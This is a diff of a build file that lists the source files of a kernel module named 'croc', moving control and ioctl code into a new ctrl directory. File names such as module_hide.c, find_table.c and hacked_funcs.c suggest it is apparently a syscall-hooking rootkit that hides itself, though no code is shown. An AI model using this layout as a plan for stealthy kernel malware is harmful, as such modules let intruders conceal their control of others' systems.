@@ -1,17 +1,17 @@
 DriverTarget(croc
     SOURCES
         module_main.c
+        ctrl/details/hash_tbl.c
+        ctrl/details/ioctl_module.c
+        ctrl/details/ioctl_proc.c
+        ctrl/details/parser_str_cmd.c
+        ctrl/details/pid_utils.c
         device/details/cdev_utils.c
         device/details/device.c
         device/details/file_ops.c
-        device/details/hash_tbl.c
-        device/details/ioctl_cmd.c
-        device/details/parser.c
         logging/details/severity_level_impl.c
-        proc/details/module_hide.c
-        proc/details/proc.c
         systbl/details/find_table.c
-        systbl/details/hook_funcs.c
+        systbl/details/hacked_funcs.c
         systbl/details/syscall_utils.c
 )
 
